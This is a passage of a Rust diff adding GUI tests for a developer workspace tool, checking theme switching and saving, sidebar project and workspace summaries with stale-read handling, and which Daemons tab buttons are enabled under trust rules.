+    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Daemons));
+}
+
+#[gpui_kit::test]
+fn the_palette_starts_a_new_workspace_and_closes_with_escape_or_its_shortcut(
+    cx: &mut TestAppContext,
+) {
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |_| {});
+    choose(cx, &h, "new work");
+    // The palette is gone and exactly one dialog (the new workspace form) is up.
+    frame(cx, &h, |window| {
+        assert!(window.find("dialog").visible());
+        assert!(window.find("create").visible(), "the New workspace form");
+    });
+    press_key(cx, &h, "escape");
+
+    open_palette(cx, &h);
+    press_key(cx, &h, "escape");
+    assert!(!dialog_is_open(cx, &h), "escape closes the palette");
+
+    open_palette(cx, &h);
+    press_key(cx, &h, "secondary-k");
+    assert!(
+        !dialog_is_open(cx, &h),
+        "the shortcut that opened it closes it"
+    );
+}
+
+#[gpui_kit::test]
+fn the_theme_switch_flips_at_once_saves_and_keeps_the_accent(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |_| {});
+    let file = cx.read_entity(&h.state, |s, _| s.settings_file().unwrap().to_path_buf());
+    assert!(!is_dark(cx));
+
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click("theme-toggle", cx)
+    })
+    .unwrap();
+    cx.run_until_parked();
+    assert!(is_dark(cx), "dark at once, with the setting on System");
+    assert_eq!(
+        cx.read_entity(&h.state, |s, _| s.settings.theme),
+        ThemeChoice::Dark
+    );
+    let saved = std::fs::read_to_string(&file).unwrap();
+    assert!(saved.contains("theme = \"dark\""), "saved: {saved}");
+    // `Theme::change` loaded the library's colors; the accent is back on top.
+    let accent = crate::theme::accent(ThemeMode::Dark);
+    assert_eq!(cx.update(|cx| cx.theme().primary), accent.primary);
+
+    // The shortcut flips it back, from anywhere.
+    press_key(cx, &h, "secondary-shift-l");
+    assert!(!is_dark(cx));
+    assert!(
+        std::fs::read_to_string(&file)
+            .unwrap()
+            .contains("theme = \"light\"")
+    );
+    let accent = crate::theme::accent(ThemeMode::Light);
+    assert_eq!(cx.update(|cx| cx.theme().primary), accent.primary);
+
+    // Other settings are not touched by the switch.
+    assert_eq!(
+        cx.read_entity(&h.state, |s, _| s.settings.editor_command.clone()),
+        Settings::default().editor_command
+    );
+    let _ = std::fs::remove_file(file);
+}
+
+#[gpui_kit::test]
+fn the_settings_page_follows_the_switch_and_a_choice_there_is_saved(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    update(cx, &h, |s, _| s.page = Page::Settings);
+    frame(cx, &h, |_| {});
+    let shown = |cx: &mut TestAppContext| {
+        cx.read_entity(&h.shell, |shell, cx| {
+            shell
+                .settings
+                .read(cx)
+                .theme
+                .read(cx)
+                .selected_index(cx)
+                .map(|ix| ThemeChoice::ALL[ix.row])
+        })
+    };
+    assert_eq!(shown(cx), Some(ThemeChoice::System));
+
+    press_key(cx, &h, "secondary-shift-l");
+    assert_eq!(
+        shown(cx),
+        Some(ThemeChoice::Dark),
+        "the page follows the switch"
+    );
+
+    // Choosing there applies and saves at once, without pressing Save.
+    cx.update_window(h.window.into(), |_, window, cx| {
+        h.state
+            .update(cx, |s, cx| s.set_theme(ThemeChoice::Light, window, cx))
+    })
+    .unwrap();
+    cx.run_until_parked();
+    assert!(!is_dark(cx));
+    assert_eq!(shown(cx), Some(ThemeChoice::Light));
+}
+
+#[gpui_kit::test]
+fn the_theme_is_in_effect_at_once_and_written_off_the_ui_thread(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |_| {});
+    let file = cx.read_entity(&h.state, |s, _| s.settings_file().unwrap().to_path_buf());
+    let set = |cx: &mut TestAppContext, choice| {
+        cx.update_window(h.window.into(), |_, window, cx| {
+            h.state.update(cx, |s, cx| s.set_theme(choice, window, cx))
+        })
+        .unwrap();
+    };
+
+    set(cx, ThemeChoice::Dark);
+    // Applied before anything was written: no file, not even its directory.
+    assert!(is_dark(cx));
+    assert_eq!(
+        cx.read_entity(&h.state, |s, _| s.settings.theme),
+        ThemeChoice::Dark
+    );
+    assert!(
+        !file.parent().unwrap().exists(),
+        "the UI thread wrote nothing"
+    );
+    cx.run_until_parked();
+    assert!(
+        std::fs::read_to_string(&file)
+            .unwrap()
+            .contains("theme = \"dark\"")
+    );
+    let toasts = cx
+        .update_window(h.window.into(), |_, window, cx| {
+            window.notifications(cx).len()
+        })
+        .unwrap();
+    assert_eq!(toasts, 0, "a saved theme is not announced");
+
+    // Quick changes: the last one is what ends up on disk.
+    for choice in [
+        ThemeChoice::Light,
+        ThemeChoice::Dark,
+        ThemeChoice::System,
+        ThemeChoice::Light,
+    ] {
+        set(cx, choice);
+    }
+    cx.run_until_parked();
+    let saved = std::fs::read_to_string(&file).unwrap();
+    assert!(saved.contains("theme = \"light\""), "saved: {saved}");
+    assert_eq!(
+        cx.read_entity(&h.state, |s, _| s.settings.theme),
+        ThemeChoice::Light
+    );
+
+    // And a change after the writer went idle is written too.
+    set(cx, ThemeChoice::Dark);
+    cx.run_until_parked();
+    assert!(
+        std::fs::read_to_string(&file)
+            .unwrap()
+            .contains("theme = \"dark\"")
+    );
+    let _ = std::fs::remove_dir_all(file.parent().unwrap());
+}
+
+#[gpui_kit::test]
+fn a_theme_that_cannot_be_saved_stays_in_effect_and_is_reported(cx: &mut TestAppContext) {
+    let dir = tempfile::tempdir().unwrap();
+    // The directory of the settings file is a regular file.
+    let blocker = dir.path().join("not-a-directory");
+    std::fs::write(&blocker, "x").unwrap();
+    let h = open(cx, install_loaded);
+    update(cx, &h, |s, _| s.set_settings_file(blocker.join("gui.toml")));
+    frame(cx, &h, |_| {});
+
+    cx.update_window(h.window.into(), |_, window, cx| {
+        h.state
+            .update(cx, |s, cx| s.set_theme(ThemeChoice::Dark, window, cx))
+    })
+    .unwrap();
+    cx.run_until_parked();
+    assert!(is_dark(cx), "still in effect for this session");
+    assert_eq!(
+        cx.read_entity(&h.state, |s, _| s.settings.theme),
+        ThemeChoice::Dark
+    );
+    let toasts = cx
+        .update_window(h.window.into(), |_, window, cx| {
+            window.notifications(cx).len()
+        })
+        .unwrap();
+    assert_eq!(toasts, 1, "the failure is reported");
+}
+
+#[gpui_kit::test]
+fn a_saved_form_is_not_overwritten_by_an_older_theme_write(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |_| {});
+    let file = cx.read_entity(&h.state, |s, _| s.settings_file().unwrap().to_path_buf());
+    // A theme change is waiting for its background write ...
+    cx.update_window(h.window.into(), |_, window, cx| {
+        h.state
+            .update(cx, |s, cx| s.set_theme(ThemeChoice::Dark, window, cx))
+    })
+    .unwrap();
+    // ... when the Settings form saves other settings.
+    let form = Settings {
+        editor_command: "zed".into(),
+        theme: ThemeChoice::Dark,
+        ..Settings::default()
+    };
+    update(cx, &h, |s, _| s.store_settings(form.clone())).unwrap();
+    cx.run_until_parked();
+    let saved = std::fs::read_to_string(&file).unwrap();
+    assert_eq!(toml::from_str::<Settings>(&saved).unwrap(), form);
+    assert_eq!(cx.read_entity(&h.state, |s, _| s.settings.clone()), form);
+    let _ = std::fs::remove_dir_all(file.parent().unwrap());
+}
+
+#[gpui_kit::test]
+fn the_theme_follows_the_os_only_while_the_setting_is_system(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |_| {});
+    // The OS (the test platform) is light.
+    let follow = |cx: &mut TestAppContext| {
+        cx.update_window(h.window.into(), |_, window, cx| {
+            h.state
+                .update(cx, |s, cx| s.follow_system_appearance(window, cx))
+        })
+        .unwrap();
+    };
+
+    cx.update(|cx| Theme::change(ThemeMode::Dark, None, cx));
+    assert!(is_dark(cx));
+    follow(cx);
+    assert!(!is_dark(cx), "System follows the OS");
+
+    cx.update_window(h.window.into(), |_, window, cx| {
+        h.state
+            .update(cx, |s, cx| s.set_theme(ThemeChoice::Dark, window, cx))
+    })
+    .unwrap();
+    follow(cx);
+    assert!(is_dark(cx), "an explicit choice stays");
+}
+
+/// "shop" (loaded, selected, unfolded) and "blog" (unfolded, workspaces read).
+fn shop_and_blog(state: &mut AppState) {
+    install_loaded(state);
+    let shop = state.selection.current().unwrap().key.project;
+    let blog = blog_entry();
+    let summary = |list| ProjectSummary {
+        workspaces: list,
+        loaded: true,
+        ..Default::default()
+    };
+    let shop_summary = summary(workspace_summaries(
+        &state.selection.current().unwrap().workspaces,
+    ));
+    state.summaries.insert(shop, shop_summary);
+    state.summaries.insert(
+        blog.id,
+        summary(vec![
+            WorkspaceSummary {
+                name: "main".into(),
+                state: WorkspaceState::Ready,
+                is_default: true,
+            },
+            WorkspaceSummary {
+                name: "wip".into(),
+                state: WorkspaceState::InProgress,
+                is_default: false,
+            },
+        ]),
+    );
+    state.expanded = [shop, blog.id].into();
+    state.entries.push(blog);
+}
+
+fn ids(cx: &mut TestAppContext, h: &Harness) -> (Uuid, Uuid) {
+    cx.read_entity(&h.state, |s, _| (s.entries[0].id, s.entries[1].id))
+}
+
+#[gpui_kit::test]
+fn the_sidebar_is_a_tree_of_projects_and_their_workspaces(cx: &mut TestAppContext) {
+    let h = open(cx, shop_and_blog);
+    let (shop, blog) = ids(cx, &h);
+    frame(cx, &h, |window| {
+        for id in [
+            project_id(shop),
+            workspace_id(shop, "main"),
+            workspace_id(shop, "feature-x"),
+            workspace_id(shop, "adopted"),
+            new_workspace_id(shop),
+            project_id(blog),
+            workspace_id(blog, "main"),
+            workspace_id(blog, "wip"),
+            new_workspace_id(blog),
+        ] {
+            assert!(window.find(id.clone()).visible(), "{id} is in the tree");
+        }
+        // Workspaces are indented under their project.
+        assert!(
+            window.find(workspace_id(shop, "main")).bounds().left()
+                > window.find(project_id(shop)).bounds().left()
+        );
+    });
+
+    // Clicking a workspace of the shown project selects its row in the table.
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click(workspace_id(shop, "feature-x"), cx)
+    })
+    .unwrap();
+    cx.run_until_parked();
+    let (selected, row) = cx.read_entity(&h.shell, |shell, cx| {
+        let state = shell.state.read(cx);
+        let table = &shell.project.read(cx).workspaces.read(cx).table;
+        (
+            state
+                .selection
+                .current()
+                .unwrap()
+                .selected_workspace
+                .clone(),
+            table.read(cx).selected_row(),
+        )
+    });
+    assert_eq!(selected.as_deref(), Some("feature-x"));
+    assert_eq!(row, Some(1), "the table highlights that workspace");
+
+    // A workspace of another project selects the project, on the Workspaces tab.
+    update(cx, &h, |s, _| s.tab = Tab::Logs);
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click(workspace_id(blog, "wip"), cx)
+    })
+    .unwrap();
+    cx.run_until_parked();
+    let (project, workspace, page_tab) = cx.read_entity(&h.state, |s, _| {
+        let model = s.selection.current().unwrap();
+        (
+            model.key.project,
+            model.selected_workspace.clone(),
+            (s.page, s.tab),
+        )
+    });
+    assert_eq!(project, blog);
+    assert_eq!(workspace.as_deref(), Some("wip"));
+    assert_eq!(page_tab, (Page::Project, Tab::Workspaces));
+    assert!(
+        cx.read_entity(&h.state, |s, _| s.is_expanded(shop)),
+        "shop stays unfolded"
+    );
+
+    // Clicking the project that is shown folds it, and again unfolds it.
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click(project_id(blog), cx)
+    })
+    .unwrap();
+    frame(cx, &h, |window| {
+        assert!(window.try_find(workspace_id(blog, "wip")).is_none());
+        assert!(window.try_find(new_workspace_id(blog)).is_none());
+        assert!(window.try_find(workspace_id(shop, "main")).is_some());
+    });
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click(project_id(blog), cx)
+    })
+    .unwrap();
+    frame(cx, &h, |window| {
+        assert!(window.find(workspace_id(blog, "wip")).visible());
+    });
+}
+
+#[gpui_kit::test]
+fn the_new_workspace_row_of_a_project_waits_for_it_to_load(cx: &mut TestAppContext) {
+    let h = open(cx, shop_and_blog);
+    let (shop, blog) = ids(cx, &h);
+    let project = cx.read_entity(&h.state, |s, _| {
+        s.selection.current().unwrap().project.clone()
+    });
+    frame(cx, &h, |_| {});
+
+    // The selected, loaded project opens the form at once.
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click(new_workspace_id(shop), cx)
+    })
+    .unwrap();
+    cx.run_until_parked();
+    assert!(dialog_is_open(cx, &h));
+    press_key(cx, &h, "escape");
+
+    // Another project is selected first; the form follows once it is loaded.
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click(new_workspace_id(blog), cx)
+    })
+    .unwrap();
+    cx.run_until_parked();
+    assert_eq!(
+        cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key.project),
+        blog
+    );
+    assert!(!dialog_is_open(cx, &h), "its workspaces are not known yet");
+
+    let loaded = Refreshed {
+        project: project.unwrap(),
+        workspaces: Ok(vec![WorkspaceStatus {
+            workspace: workspace("main", true),
+            receipt: None,
+            status: None,
+            busy: false,
+        }]),
+        database: DatabaseModel::default(),
+        services: crate::services::ServicesModel::default(),
+        trust: Ok(TrustState::Trusted),
+        pitchfork: None,
+        config: None,
+        logs: None,
+    };
+    update(cx, &h, |s, cx| {
+        let stamp = s.selection.current_mut().unwrap().begin_refresh();
+        s.apply_refresh(stamp, false, Ok(loaded), cx)
+    });
+    cx.run_until_parked();
+    assert!(
+        dialog_is_open(cx, &h),
+        "the form opened when the project loaded"
+    );
+    // And what the refresh read is what the sidebar lists.
+    let names = cx.read_entity(&h.state, |s, _| {
+        s.summaries[&blog]
+            .workspaces
+            .iter()
+            .map(|w| w.name.clone())
+            .collect::<Vec<_>>()
+    });
+    assert_eq!(names, ["main"]);
+}
+
+#[gpui_kit::test]
+fn a_new_workspace_is_not_waited_for_in_a_project_that_cannot_load(cx: &mut TestAppContext) {
+    let h = open(cx, shop_and_blog);
+    let (_, blog) = ids(cx, &h);
+    frame(cx, &h, |_| {});
+    update(cx, &h, |s, cx| s.request_new_workspace(Some(blog), cx));
+    let failed = Err(LoadError::NotInitialized);
+    update(cx, &h, |s, cx| {
+        let stamp = s.selection.current_mut().unwrap().begin_refresh();
+        s.apply_refresh(stamp, false, failed, cx)
+    });
+    cx.run_until_parked();
+    assert!(!dialog_is_open(cx, &h), "nothing to create a workspace in");
+    let error = cx.read_entity(&h.state, |s, _| s.summaries[&blog].error.clone());
+    assert_eq!(error.as_deref(), Some("not initialized"));
+}
+
+#[gpui_kit::test]
+fn a_refresh_of_the_selected_project_updates_its_sidebar_summary(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    let shop = cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key.project);
+    let result: Result<Refreshed, LoadError> = Ok(refreshed(&h, cx, "web"));
+    update(cx, &h, |s, cx| {
+        s.inflight = MAX_JOBS + 1;
+        let stamp = s.selection.current_mut().unwrap().begin_refresh();
+        s.apply_refresh(stamp, false, result, cx)
+    });
+    let list = cx.read_entity(&h.state, |s, _| s.summaries[&shop].clone());
+    assert!(list.loaded && list.error.is_none());
+    let seen: Vec<_> = list
+        .workspaces
+        .iter()
+        .map(|w| (w.name.as_str(), w.state, w.is_default))
+        .collect();
+    assert_eq!(
+        seen,
+        [
+            ("main", WorkspaceState::Ready, true),
+            ("feature-x", WorkspaceState::NeedsAttention, false),
+            ("adopted", WorkspaceState::NotSetUp, false),
+        ]
+    );
+}
+
+#[gpui_kit::test]
+fn a_summary_read_from_before_a_change_is_dropped(cx: &mut TestAppContext) {
+    let h = open(cx, shop_and_blog);
+    let (_, blog) = ids(cx, &h);
+    let root = PathBuf::from("/tmp/blog");
+    let list = |name: &str| {
+        vec![WorkspaceSummary {
+            name: name.into(),
+            state: WorkspaceState::Ready,
+            is_default: true,
+        }]
+    };
+    let names = |cx: &mut TestAppContext| {
+        cx.read_entity(&h.state, |s, _| {
+            s.summaries[&blog]
+                .workspaces
+                .iter()
+                .map(|w| w.name.clone())
+                .collect::<Vec<_>>()
+        })
+    };
+    // A read is in flight (of a project that is folded) ...
+    let stamp = update(cx, &h, |s, _| {
+        s.expanded.remove(&blog);
+        let generation = s.summaries.get_mut(&blog).unwrap().begin_read();
+        SummaryStamp {
+            project: blog,
+            root: root.clone(),
+            generation,
+        }
+    });
+    // ... when a mutation of that project starts (or a refresh writes it).
+    update(cx, &h, |s, _| s.invalidate_summary(blog));
+    update(cx, &h, |s, cx| {
+        s.apply_summary(stamp.clone(), Ok(list("stale")), cx)
+    });
+    assert_eq!(names(cx), ["main", "wip"], "the stale read changed nothing");
+    assert!(!cx.read_entity(&h.state, |s, _| s.summaries[&blog].is_reading()));
+
+    // A read that is current is applied.
+    let current = update(cx, &h, |s, _| SummaryStamp {
+        generation: s.summaries[&blog].generation,
+        ..stamp.clone()
+    });
+    update(cx, &h, |s, cx| {
+        s.apply_summary(current, Ok(list("fresh")), cx)
+    });
+    assert_eq!(names(cx), ["fresh"]);
+
+    // One for a project that moved, or was forgotten, is dropped.
+    let current = update(cx, &h, |s, _| SummaryStamp {
+        generation: s.summaries[&blog].generation,
+        ..stamp.clone()
+    });
+    let moved = SummaryStamp {
+        root: PathBuf::from("/tmp/elsewhere"),
+        ..current.clone()
+    };
+    update(cx, &h, |s, cx| {
+        s.apply_summary(moved, Ok(list("moved")), cx)
+    });
+    assert_eq!(names(cx), ["fresh"]);
+
+    // A stale read of a project that is unfolded is made again.
+    update(cx, &h, |s, cx| {
+        s.expanded.insert(blog);
+        let summary = s.summaries.get_mut(&blog).unwrap();
+        let stale = SummaryStamp {
+            generation: summary.begin_read(),
+            ..current.clone()
+        };
+        summary.invalidate();
+        s.apply_summary(stale, Ok(list("stale")), cx)
+    });
+    assert!(
+        cx.read_entity(&h.state, |s, _| s.summaries[&blog].is_reading()),
+        "a new read started"
+    );
+    assert_eq!(names(cx), ["fresh"]);
+
+    update(cx, &h, |s, cx| {
+        s.entries.retain(|e| e.id != blog);
+        s.summaries.remove(&blog);
+        s.apply_summary(current, Ok(list("gone")), cx)
+    });
+    assert!(cx.read_entity(&h.state, |s, _| !s.summaries.contains_key(&blog)));
+}
+
+/// Start a sidebar read of `blog` by hand: what `refresh_summary` does,
+/// without a task, so the test decides when it ends.
+fn start_summary_read(cx: &mut TestAppContext, h: &Harness, blog: Uuid) -> SummaryStamp {
+    update(cx, h, |s, _| {
+        s.inflight += 1;
+        SummaryStamp {
+            project: blog,
+            root: PathBuf::from("/tmp/blog"),
+            generation: s.summaries.entry(blog).or_default().begin_read(),
+        }
+    })
+}
+
+/// Forget "blog" and add it again (the same id and root), unfolded.
+fn remove_and_add_again(cx: &mut TestAppContext, h: &Harness, blog: Uuid) {
+    update(cx, h, |s, _| {
+        let at = s.entries.iter().position(|e| e.id == blog).unwrap();
+        let entry = s.entries.remove(at);
+        s.expanded.remove(&blog);
+        s.summaries.remove(&blog);
+        s.entries.push(entry);
+        s.expanded.insert(blog);
+    });
+}
+
+fn blog_names(cx: &mut TestAppContext, h: &Harness, blog: Uuid) -> Vec<String> {
+    cx.read_entity(&h.state, |s, _| {
+        s.summaries[&blog]
+            .workspaces
+            .iter()
+            .map(|w| w.name.clone())
+            .collect()
+    })
+}
+
+fn one_workspace(name: &str) -> Vec<WorkspaceSummary> {
+    vec![WorkspaceSummary {
+        name: name.into(),
+        state: WorkspaceState::Ready,
+        is_default: true,
+    }]
+}
+
+#[gpui_kit::test]
+fn a_read_from_before_a_project_was_removed_cannot_overwrite_the_one_after_it_was_added(
+    cx: &mut TestAppContext,
+) {
+    let h = open(cx, shop_and_blog);
+    let (_, blog) = ids(cx, &h);
+    update(cx, &h, |s, _| s.inflight = 0);
+
+    // A read is running when the project is removed and added again; the new
+    // entry starts its own read.
+    let old = start_summary_read(cx, &h, blog);
+    remove_and_add_again(cx, &h, blog);
+    let new = start_summary_read(cx, &h, blog);
+    assert_ne!(old.generation, new.generation, "an identity is not reused");
+
+    // The new read ends first, the old one last: it must not win.
+    update(cx, &h, |s, cx| {
+        s.apply_summary(new, Ok(one_workspace("fresh")), cx)
+    });
+    assert_eq!(blog_names(cx, &h, blog), ["fresh"]);
+    update(cx, &h, |s, cx| {
+        s.apply_summary(old, Ok(one_workspace("stale")), cx)
+    });
+    assert_eq!(
+        blog_names(cx, &h, blog),
+        ["fresh"],
+        "the old read is dropped"
+    );
+}
+
+#[gpui_kit::test]
+fn an_old_read_ending_does_not_hide_the_new_one_that_is_running(cx: &mut TestAppContext) {
+    let h = open(cx, shop_and_blog);
+    let (_, blog) = ids(cx, &h);
+    update(cx, &h, |s, _| s.inflight = 0);
+
+    let old = start_summary_read(cx, &h, blog);
+    remove_and_add_again(cx, &h, blog);
+    let new = start_summary_read(cx, &h, blog);
+
+    // The old read ends while the new one runs: it is dropped, and the new
+    // one is still the read in flight (so no second read starts beside it).
+    update(cx, &h, |s, cx| {
+        s.apply_summary(old, Ok(one_workspace("stale")), cx)
+    });
+    cx.read_entity(&h.state, |s, _| {
+        assert!(s.summaries[&blog].is_reading(), "the new read is running");
+        assert_eq!(s.inflight, 1, "one read, one slot");
+    });
+    assert!(blog_names(cx, &h, blog).is_empty());
+
+    update(cx, &h, |s, cx| {
+        s.apply_summary(new, Ok(one_workspace("fresh")), cx)
+    });
+    assert_eq!(blog_names(cx, &h, blog), ["fresh"]);
+    cx.read_entity(&h.state, |s, _| {
+        assert!(!s.summaries[&blog].is_reading());
+        assert_eq!(s.inflight, 0);
+    });
+}
+
+#[gpui_kit::test]
+fn a_read_waiting_for_a_job_slot_starts_when_one_frees_and_only_if_still_wanted(
+    cx: &mut TestAppContext,
+) {
+    let h = open(cx, shop_and_blog);
+    let (_, blog) = ids(cx, &h);
+    // Every slot is taken: the read waits, once.
+    update(cx, &h, |s, cx| {
+        s.summaries.remove(&blog);
+        s.refresh_summary(blog, cx);
+        s.refresh_summary(blog, cx);
+    });
+    cx.read_entity(&h.state, |s, _| {
+        assert_eq!(s.pending_summaries, [blog]);
+        assert!(!s.summaries.contains_key(&blog), "nothing started");
+    });
+
+    // A slot frees, but the project was folded meanwhile.
+    update(cx, &h, |s, cx| {
+        s.expanded.remove(&blog);
+        s.inflight = MAX_JOBS - 1;
+        s.start_queued_summaries(cx);
+    });
+    cx.read_entity(&h.state, |s, _| {
+        assert!(s.pending_summaries.is_empty());
+        assert!(
+            !s.summaries.contains_key(&blog),
+            "a folded project is not read"
+        );
+        assert_eq!(s.inflight, MAX_JOBS - 1);
+    });
+
+    // Unfolded again with no slot free, then a slot frees: now it is read.
+    update(cx, &h, |s, cx| {
+        s.inflight = MAX_JOBS;
+        s.toggle_expanded(blog, cx);
+        assert_eq!(s.pending_summaries, [blog]);
+        s.inflight = MAX_JOBS - 1;
+        s.start_queued_summaries(cx);
+    });
+    cx.read_entity(&h.state, |s, _| {
+        assert!(s.pending_summaries.is_empty());
+        assert!(s.summaries[&blog].is_reading(), "the queued read started");
+        assert_eq!(s.inflight, MAX_JOBS);
+    });
+}
+
+#[gpui_kit::test]
+fn a_refresh_reads_every_unfolded_project_even_with_few_job_slots(cx: &mut TestAppContext) {
+    let scratch = scratch_project();
+    let others: Vec<Entry> = (0..4)
+        .map(|i| another_scratch_project(&scratch, &format!("project-{i}")))
+        .collect();
+    let h = open_scratch(cx, &scratch);
+    // Five unfolded projects (the selected one and four more), whose
+    // workspaces were read before and are out of date now.
+    update(cx, &h, |s, _| {
+        s.expanded.insert(scratch.entry.id);
+        for entry in &others {
+            s.entries.push(entry.clone());
+            s.expanded.insert(entry.id);
+            s.summaries.insert(
+                entry.id,
+                ProjectSummary {
+                    workspaces: one_workspace("out-of-date"),
+                    loaded: true,
+                    ..Default::default()
+                },
+            );
+        }
+    });
+    let current = |s: &AppState, entry: &Entry| {
+        let list = &s.summaries[&entry.id].workspaces;
+        list.len() == 1 && list[0].name != "out-of-date"
+    };
+
+    update(cx, &h, |s, cx| {
+        s.refresh_all(cx);
+        s.refresh_all(cx);
+    });
+    cx.read_entity(&h.state, |s, _| {
+        let reading = others
+            .iter()
+            .filter(|e| s.summaries[&e.id].is_reading())
+            .count();
+        assert_eq!(s.inflight, MAX_JOBS, "the selected project and three reads");
+        assert_eq!(reading, MAX_JOBS - 1);
+        assert_eq!(s.pending_summaries.len(), 1, "the fourth waits, once");
+    });
+
+    settle(cx, &h, |s| {
+        s.inflight == 0 && others.iter().all(|entry| current(s, entry))
+    });
+    cx.read_entity(&h.state, |s, _| assert!(s.pending_summaries.is_empty()));
+}
+
+#[gpui_kit::test]
+fn unfolding_a_project_reads_its_workspaces_off_the_ui_thread(cx: &mut TestAppContext) {
+    let scratch = scratch_project();
+    let other = another_scratch_project(&scratch, "blog");
+    let h = open_scratch(cx, &scratch);
+    update(cx, &h, |s, _| s.entries.push(other.clone()));
+    assert!(!cx.read_entity(&h.state, |s, _| s.summaries.contains_key(&other.id)));
+
+    update(cx, &h, |s, cx| s.toggle_expanded(other.id, cx));
+    assert!(
+        cx.read_entity(&h.state, |s, _| s.summaries[&other.id].is_reading()),
+        "the read started in the background"
+    );
+    settle(cx, &h, |s| {
+        s.summaries.get(&other.id).is_some_and(|p| p.loaded)
+    });
+    let (list, inflight) = cx.read_entity(&h.state, |s, _| {
+        (s.summaries[&other.id].clone(), s.inflight)
+    });
+    assert_eq!(list.workspaces.len(), 1);
+    assert!(list.workspaces[0].is_default);
+    assert!(!list.is_reading());
+    assert_eq!(inflight, 0, "the job slot was given back");
+
+    // The selected project is never read separately: its refreshes cover it.
+    update(cx, &h, |s, cx| s.toggle_expanded(scratch.entry.id, cx));
+    update(cx, &h, |s, cx| s.toggle_expanded(scratch.entry.id, cx));
+    assert!(!cx.read_entity(&h.state, |s, _| {
+        s.summaries
+            .get(&scratch.entry.id)
+            .is_some_and(|p| p.is_reading())
+    }));
+}
+
+#[gpui_kit::test]
+fn the_empty_states_offer_what_to_do_next(cx: &mut TestAppContext) {
+    let h = open(cx, |_| {});
+    frame(cx, &h, |window| {
+        assert!(window.find("add-project").visible(), "no projects: add one");
+    });
+    update(cx, &h, |s, cx| {
+        s.entries_error = Some("cannot read the registry".into());
+        cx.notify();
+    });
+    frame(cx, &h, |window| {
+        assert!(window.find("retry-projects").visible());
+    });
+}
+
+// --- processes: the Daemons tab and per-workspace trust ---------------------------
+
+/// Replace the selected project's pitchfork model and show the Daemons tab.
+fn show_daemons(cx: &mut TestAppContext, h: &Harness, model: PitchforkModel) {
+    update(cx, h, |s, cx| {
+        s.tab = Tab::Daemons;
+        s.selection.current_mut().unwrap().pitchfork = model;
+        cx.notify();
+    });
+    frame(cx, h, |_| {});
+}
+
+fn status_mut(model: &mut PitchforkModel) -> &mut ProcessStatus {
+    model.status.as_mut().unwrap()
+}
+
+fn notice(window: &gpui_kit::Window, id: &'static str) -> bool {
+    window.try_find(id).is_some_and(|e| e.visible())
+}
+
+/// What the toolbar and the first two rows may do, as the view computes it.
+fn gates(status: &ProcessStatus, busy: bool) -> (bool, bool, bool, bool, bool, bool) {
+    use super::processes::{actions, row_can_start};
+    let a = actions(status, busy);
+    (
+        a.start,
+        a.review,
+        a.stop,
+        a.restart,
+        row_can_start(&status.daemons[0], busy),
+        row_can_start(&status.daemons[1], busy),
+    )
+}
+
+#[gpui_kit::test]
+fn the_daemons_tab_enables_its_buttons_only_where_core_allows_the_action(cx: &mut TestAppContext) {
+    use devflow_core::{processes::Action, trust::Trigger};
+    let h = open(cx, install_loaded);
+    let daemons = cx.read_entity(&h.state, |s, _| {
+        s.selection.current().unwrap().pitchfork.clone()
+    });
+    let status = |model: &PitchforkModel| model.status.clone().unwrap();
+    let buttons = |window: &gpui_kit::Window| {
+        for id in ["daemons-start", "daemons-stop", "daemons-restart"] {
+            assert!(window.find(id).visible(), "{id} is laid out");
+        }
+        assert!(window.find(("daemon-start", 0usize)).visible());
+        assert!(window.find(("daemon-start", 1usize)).visible());
+    };
+
+    // Everything is allowed: the running daemon can be stopped, the other started.
+    // (start, review, stop, restart, row 0 = web is running, row 1 = api)
+    assert_eq!(
+        gates(&status(&daemons), false),
+        (true, false, true, true, false, true)
+    );
+    show_daemons(cx, &h, daemons.clone());
+    frame(cx, &h, |window| {
+        buttons(window);
+        assert!(window.find(("daemon-url", 0usize)).visible());
+        assert!(!notice(window, "start-note") && !notice(window, "autostart-note"));
+        assert!(!notice(window, "pitchfork-install"), "pitchfork is usable");
+    });
+
+    // Not approved: starting goes through a review, stopping is refused.
+    let mut model = daemons.clone();
+    {
+        let status = status_mut(&mut model);
+        status.can_start = refused(Refusal::NotApproved {
+            action: Action::Start,
+            changed: true,
+            format_changed: false,
+        });
+        status.can_stop = refused(Refusal::NotApproved {
+            action: Action::Stop,
+            changed: true,
+            format_changed: false,
+        });
+        for d in &mut status.daemons {
+            d.startable = false;
+        }
+    }
+    assert_eq!(
+        gates(&status(&model), false),
+        (true, true, false, false, false, false),
+        "'Review and start…' is the one way forward"
+    );
+    show_daemons(cx, &h, model);
+    frame(cx, &h, |window| {
+        buttons(window);
+        assert!(notice(window, "start-note"), "core's reason is shown");
+        assert!(notice(window, "stop-note"));
+    });
+
+    // A daemon that starts on its own: no bulk start, and autostart says why it is off.
+    let mut model = daemons.clone();
+    {
+        let status = status_mut(&mut model);
+        status.can_start = refused(Refusal::AutonomousTriggers {
+            triggers: vec![Trigger {
+                file: "pitchfork.toml".into(),
+                daemon: "tick".into(),
+                trigger: "cron".into(),
+            }],
+        });
+        status.autostart = true;
+        status.autostart_blocked =
+            Some("autostart is off for this workspace: tick (cron) start on their own".into());
+        status.daemons[0].triggers = vec!["cron".into()];
+    }
+    assert_eq!(
+        gates(&status(&model), false),
+        (false, false, true, false, false, true),
+        "no bulk start, but a plain daemon by name"
+    );
+    show_daemons(cx, &h, model);
+    frame(cx, &h, |window| {
+        buttons(window);
+        assert!(notice(window, "autostart-note"));
+        assert!(notice(window, "start-note"));
+    });
+
+    // Not ready: nothing starts.
+    let mut model = daemons.clone();
+    {
